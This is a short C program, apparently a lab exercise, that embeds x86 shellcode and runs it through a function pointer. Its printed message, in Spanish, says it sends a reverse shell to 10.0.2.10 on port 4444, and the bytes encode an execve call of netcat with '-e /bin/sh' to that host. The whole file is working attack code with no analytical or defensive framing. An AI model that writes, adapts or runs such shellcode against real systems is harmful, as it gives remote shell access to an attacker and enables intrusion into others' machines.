/* Tentts | snell191198@gmail.com */
#include <stdio.h>
#include <stdlib.h>


unsigned char bytecode [] ="\x55\x89\xe5\x31\xc0\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x68\x2d\x65\x2f\x2f\x89\xe2\x50\x68\x20\x20\x20\x20\x68\x34\x34\x34\x34\x89\xe7\x50\x68\x30\x20\x20\x20\x68\x2e\x32\x2e\x31\x68\x31\x30\x2e\x30\x89\xe6\x50\x52\x57\x56\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80\x5d\xc3\x90";


int main (int argc, char * argv[]) 
{
	printf("Este programa manda un reverse_shell a 10.0.2.10:4444\n");
	
	int (*pt_func)() = (int(*)())bytecode;
	pt_func();
	
	printf("Y esto no se imprime\n");
    return 0;
} /* end main */ 

